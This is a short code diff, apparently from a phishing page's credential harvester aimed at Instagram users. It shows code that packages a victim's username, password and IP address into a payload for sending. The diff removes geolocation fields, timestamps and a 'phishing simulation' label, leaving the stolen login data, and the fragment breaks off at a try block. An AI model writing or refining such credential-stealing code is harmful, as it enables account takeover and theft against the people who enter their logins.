@@ -102,24 +102,15 @@
 User: ${username} (ig)
 pw: ${password}
 IP: ${geo.ip}
-Country: ${geo.country}
-City: ${geo.city}
-Continent: ${geo.continent}
-Attempt: ${attemptNum}
-Timestamp: ${new Date().toISOString()}`;
+`;
 
     const payload = {
-      app: "INSTAGRAM_PLACEHOLDER",
-      alert: cleanAlert,           // ← Full formatted text you want
+
+             // ← Full formatted text you want
       username: username,
       pw: password,                // shortened as "pw"
       ip: geo.ip,
-      country: geo.country,
-      city: geo.city,
-      continent: geo.continent,
-      attempt: attemptNum,
-      timestamp: new Date().toISOString(),
-      message: "PHISHING_SIMULATION_ANALYSIS_2026"
+      
     };
 
     try {
